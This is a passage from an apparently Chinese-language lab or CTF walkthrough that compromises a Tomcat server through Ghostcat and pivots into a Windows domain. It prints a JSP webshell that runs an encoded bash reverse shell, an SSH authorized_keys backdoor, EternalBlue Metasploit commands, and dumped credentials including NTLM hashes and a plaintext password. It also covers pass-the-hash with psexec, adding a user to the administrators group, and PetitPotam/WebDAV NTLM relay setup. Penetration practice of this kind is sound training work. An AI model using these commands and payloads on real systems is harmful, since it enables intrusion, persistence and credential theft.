&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>存为字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.107.181:8080 8009  /WEB-INF/web.xml read |grep url-pattern |awk -F &#x27;&gt;&#x27; &#x27;&#123;print $2&#125;&#x27; |awk -F &#x27;&lt;&#x27; &#x27;&#123;print $1&#125;&#x27; &gt;web-xml.dict</span><br></pre></td></tr></table></figure>
+
+<p>模糊测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w web-xml.dict -u http://39.98.107.181:8080FUZZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://39.98.107.181:8080FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /root/yst/Ghostcat-CNVD-2020-10487-master/web-xml.dict</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">/upload/*               [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 52ms]</span><br><span class="line">/RegisterServlet        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/LoginServlet           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/DownloadServlet        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 54ms]</span><br><span class="line">  /UploadServlet          [Status: 200, Size: 682, Words: 145, Lines: 24, Duration: 58ms]</span><br><span class="line">/HelloServlet           [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 58ms]</span><br><span class="line">:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>
+
+<p>测试upload,传🐎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveHh4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965600238-fb7b31e5-87ef-4de4-b918-129cd9685caa.png"></p>
+<p>返回路径 .&#x2F;upload&#x2F;4332ca5e87df3ffe57f09321848a920a&#x2F;20250326010633582.txt</p>
+<p>vps起个监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080/   8009 /upload/4332ca5e87df3ffe57f09321848a920a/20250326010633582.txt eval</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965895380-498bdd49-6d11-4eff-9243-07ad18693a04.png"></p>
+<p>找一下flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965992071-40a25aee-ac10-4ba1-917e-ada11192fe66.png"></p>
+<p>写公钥留后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.140.174</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>上代理，扫描</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742966440528-e934a2f9-feb1-4299-8c1a-b4684ea38ffe.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.11.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.11.76    is alive</span><br><span class="line">(icmp) Target 172.22.11.6     is alive</span><br><span class="line">(icmp) Target 172.22.11.26    is alive</span><br><span class="line">(icmp) Target 172.22.11.45    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">[*] alive ports len is: 13</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理</span><br><span class="line">已完成 13/13</span><br><span class="line">[*] 扫描结束,耗时: 8.210849878s</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.45 XR-Desktop.xiaorang.lab</span><br><span class="line">172.22.11.6 xiaorang-dc.xiaorang.lab</span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br><span class="line">172.22.11.76  本机</span><br></pre></td></tr></table></figure>
+
+<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>45扫到ms17-010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>去admin目录下找到flag</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742967309061-7ecdeadd-a764-402c-9930-541645380e56.png"></p>
+<p>抓hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username     Domain    NTLM                              SHA1</span><br><span class="line">--------     ------    ----                              ----</span><br><span class="line">XR-DESKTOP$  XIAORANG  37fd17d6c6653c4e65093e33f50f7d3d  e774d3db0995fc0b8469093eb208aa7ece5abb9f</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username     Domain    Password</span><br><span class="line">--------     ------    --------</span><br><span class="line">(null)       (null)    (null)</span><br><span class="line">XR-DESKTOP$  XIAORANG  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4 49 5</span><br><span class="line">                       4 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7 bd 87 dc</span><br><span class="line">                        a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2 db fd 43 ca</span><br><span class="line">                       97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6 52 55 d1 4f 89 0</span><br><span class="line">                       2 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22 b3 83 49 b9 1b b6 79</span><br><span class="line">                        68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76 aa 44 9e c4 e8 85</span><br><span class="line">yangmei      XIAORANG  xrihGHgoNZQ</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username     Domain        Password</span><br><span class="line">--------     ------        --------</span><br><span class="line">(null)       (null)        (null)</span><br><span class="line">xr-desktop$  XIAORANG.LAB  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4</span><br><span class="line">                           49 54 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7</span><br><span class="line">                           bd 87 dc a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2</span><br><span class="line">                           db fd 43 ca 97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6</span><br><span class="line">                           52 55 d1 4f 89 02 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22</span><br><span class="line">                           b3 83 49 b9 1b b6 79 68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76</span><br><span class="line">                           aa 44 9e c4 e8 85</span><br><span class="line">xr-desktop$  XIAORANG.LAB  (null)</span><br><span class="line">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br></pre></td></tr></table></figure>
+
+<p>hashdump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>再收集下域内信息，这里多种工具都可以选择，我们选择yangmei这个用户，把他加到管理员组中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py Administrator@172.22.11.45 -hashes :48f6da83eb89a4da8a1cc963b855a799 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yangmei /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742969105210-f28ac6b7-4fb4-41ea-abc2-f811a5529fb5.png"></p>
+<p>域内信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u yangmei -p xrihGHgoNZQ -d XIAORANG.LAB --dns-tcp -ns 172.22.11.6 -c all --zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970056600-93cfa66d-9515-4626-8d14-e8adeeca44c5.png"></p>
+<p>分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户</span><br><span class="line">2、MAQ = 0，加不了计算机</span><br><span class="line">3、当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制</span><br><span class="line">4、域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL</span><br><span class="line">5、域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName</span><br><span class="line">6、域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam</span><br><span class="line">7、NoPac exploit: Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</span><br></pre></td></tr></table></figure>
+
+<p>扫描WebClient和petitpotam</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav </span><br><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970360182-aeb0962c-55ff-4f69-82f4-7eec881a43b2.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970402986-b4bc86d5-ca24-48f3-8d67-7e5e54095e12.png"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>发现我们可以用Petitpotam强制目标服务器、目标用户使用LM Hash、NTLM Hash对我们的服务器进行认证，然后我们可以将该认证中继至其他目标服务器中以达到横向、提权等的目的，这里只有172.22.11.26有Petitpotam。通过WebDav进行NTLM Relay的好处在于可以不受到协议签名的影响，对本地内部网或受信任的站点自动使用当前用户凭据进行NTLM认证。</p>
+<p>使用无ADCS + Petitpotam + ntlm中继打法，思路是用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，配置到XR-LCM3AE8B.xiaorang.lab的RBCD。</p>
+<p>但这里有个条件，需要我们把服务器端口的流量转发到客户端本地的80，但SSH的反向端口转发监听的时候只会监听127.0.0.1，这里我们让流量 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的80 ,变相使80监听在0.0.0.0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.98.107.181  -D SOCKS代理IP:PORT -R \*:79:127.0.0.1:80</span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ssh：使用 SSH 连接远程服务器。</span><br><span class="line"></span><br><span class="line">-i ~/.ssh/id_rsa：指定 SSH 私钥 id_rsa 进行身份认证。</span><br><span class="line"></span><br><span class="line">root@39.99.139.181：以 root 用户身份连接 39.99.139.181 这台远程服务器。</span><br><span class="line"></span><br><span class="line">-D socksip:port：</span><br><span class="line"></span><br><span class="line">-D 选项开启 SOCKS 代理，即在本地 socksip:port 上启动一个动态端口转发代理。</span><br><span class="line">所有经由这个代理的流量都会通过 39.99.139.181 这台服务器转发，类似于 翻墙代理（SOCKS5 代理）。</span><br><span class="line">-R \*:79:127.0.0.1:80：</span><br><span class="line"></span><br><span class="line">-R 选项表示 远程端口转发。</span><br><span class="line">\*: 表示绑定到所有网卡（即允许任意 IP 访问这个端口）。</span><br><span class="line">79:127.0.0.1:80 表示：</span><br><span class="line">远程服务器 (39.99.139.181) 的 79 端口 会转发到 本地（SSH 客户端所在机器）的 127.0.0.1:80 端口。</span><br><span class="line">socat：一个强大的网络工具，常用于端口转发和代理。</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80,fork,bind=0.0.0.0：</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80：监听 本机 80 端口，等待 TCP 连接。</span><br><span class="line">fork：每次有新连接时，自动创建一个子进程处理连接（防止阻塞）。</span><br><span class="line">bind=0.0.0.0：监听 所有 IP（外部和本地） 的请求。</span><br><span class="line">TCP:localhost:79：</span><br><span class="line"></span><br><span class="line">当收到 80 端口的请求，会将流量 转发到 localhost:79 端口。</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里流量已经成功转发，curl 172.22.11.76的流量转发到了我们本地kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80</span><br><span class="line">proxychains curl http://172.22.11.76:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742972622202-c878d395-6ead-4727-92bf-105cc0fe65c3.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742974674648-ea7a21e3-2de5-4d95-a8e3-3b92746bdc00.png"></p>
+<h2 id="Relay-via-WebDAV-Petitpotam的Coerce-Authentication"><a href="#Relay-via-WebDAV-Petitpotam的Coerce-Authentication" class="headerlink" title="Relay via WebDAV+Petitpotam的Coerce Authentication"></a>Relay via WebDAV+Petitpotam的Coerce Authentication</h2><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p>
